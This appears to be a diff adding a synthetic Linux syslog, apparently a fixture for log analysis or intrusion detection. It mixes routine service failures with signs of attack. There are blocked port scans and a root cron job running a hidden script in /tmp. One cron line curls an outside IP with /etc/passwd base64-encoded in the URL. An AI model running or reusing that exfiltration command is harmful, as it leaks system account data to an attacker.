@@ -1,0 +1,30 @@
+Mar  4 02:00:01 server01 systemd[1]: Starting Daily apt download activities...
+Mar  4 02:00:05 server01 systemd[1]: Started Daily apt download activities.
+Mar  4 02:15:33 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=185.22.91.44 DST=10.0.1.20 LEN=44 TTL=50 PROTO=TCP SPT=44888 DPT=22 WINDOW=1024 SYN URGP=0
+Mar  4 02:30:00 server01 CRON[11201]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))
+Mar  4 03:00:15 server01 systemd[1]: mysql.service: Main process exited, code=killed, signal=SEGV
+Mar  4 03:00:15 server01 systemd[1]: mysql.service: Failed with result 'signal'.
+Mar  4 03:00:20 server01 systemd[1]: mysql.service: Scheduled restart job, restart counter is at 3.
+Mar  4 03:00:20 server01 systemd[1]: Starting MySQL Community Server...
+Mar  4 03:00:25 server01 systemd[1]: Started MySQL Community Server.
+Mar  4 03:05:11 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51234 DPT=3306 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:12 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51235 DPT=5432 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:13 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51236 DPT=6379 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:14 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51237 DPT=27017 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:15 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51238 DPT=8080 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:16 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51239 DPT=443 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:17 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51240 DPT=8443 WINDOW=1024 SYN URGP=0
+Mar  4 03:05:18 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=103.45.67.89 DST=10.0.1.20 LEN=44 TTL=48 PROTO=TCP SPT=51241 DPT=9200 WINDOW=1024 SYN URGP=0
+Mar  4 03:30:05 server01 CRON[11500]: (www-data) CMD (/usr/bin/curl http://45.33.22.11/collect.php?data=$(cat /etc/passwd | base64))
+Mar  4 03:45:00 server01 systemd[1]: apache2.service: Main process exited, code=exited, status=1/FAILURE
+Mar  4 03:45:00 server01 systemd[1]: apache2.service: Failed with result 'exit-code'.
+Mar  4 03:45:05 server01 systemd[1]: apache2.service: Scheduled restart job, restart counter is at 1.
+Mar  4 03:45:05 server01 systemd[1]: Starting The Apache HTTP Server...
+Mar  4 03:45:10 server01 systemd[1]: Started The Apache HTTP Server.
+Mar  4 04:00:00 server01 kernel: Out of memory: Killed process 15234 (java) total-vm:4567892kB, anon-rss:3234567kB, file-rss:0kB, shmem-rss:0kB
+Mar  4 04:15:22 server01 systemd[1]: nginx.service: Failed with result 'exit-code'.
+Mar  4 04:30:00 server01 CRON[12000]: (root) CMD (/tmp/.hidden_cron.sh)
+Mar  4 05:00:00 server01 systemd[1]: Starting Daily Cleanup of Temporary Directories...
+Mar  4 05:00:05 server01 systemd[1]: Finished Daily Cleanup of Temporary Directories.
+Mar  4 06:00:00 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=91.134.55.77 DST=10.0.1.20 LEN=44 TTL=45 PROTO=TCP SPT=60001 DPT=4444 WINDOW=1024 SYN URGP=0
+Mar  4 06:00:01 server01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=00:16:3e:5e:6c:00 SRC=91.134.55.77 DST=10.0.1.20 LEN=44 TTL=45 PROTO=TCP SPT=60002 DPT=4445 WINDOW=1024 SYN URGP=0
